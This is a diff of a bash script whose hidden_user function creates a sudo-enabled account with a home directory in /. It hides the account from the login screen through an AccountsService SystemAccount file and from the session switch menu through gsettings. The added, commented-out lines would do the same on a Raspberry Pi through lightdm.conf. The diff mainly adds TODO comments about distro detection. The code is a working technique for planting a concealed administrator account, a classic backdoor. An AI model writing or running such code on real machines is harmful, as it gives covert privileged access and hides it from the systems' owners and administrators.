@@ -9,6 +9,8 @@
 
 #function hidden_user makes a admin user a home directory in / and hides it form login prompt
 function hidden_user () {
+
+    #TODO detect distro
 	user_name=user
 
 	#add user with hidden home directory
@@ -20,13 +22,20 @@ function hidden_user () {
 	#add user to sudoers
 	sudo usermod -aG sudo $user_name
 
+    #TODO fo this if Ubuntu
 	#hide from login screen
 	touch $user_name
 	printf "[User]\nSystemAccount=true\n" > $user_name
 	sudo mv $user_name /var/lib/AccountsService/users/$user_name
 
-	#hide user from logout/switch
+	#TODO do this if Ubuntu and has unity
+    #hide user from logout/switch
 	gsettings set com.canonical.indicator.session user-show-menu false
+
+    #TODO if Raspberry Pi
+    #chnage the /etc/lightdm/lightdm.conf file to hide user from login prompt
+    #sudo sed -i '/greeter-hide-users=false/c\greeter-hide-users=true' /etc/lightdm/lightdm.conf
+    #sudo sed -i '/autologin-user=pi/c\#autologin-user=pi' /etc/lightdm/lightdm.conf
 }
 
 #function are_you_sudo check if the user has sudo privilege or not
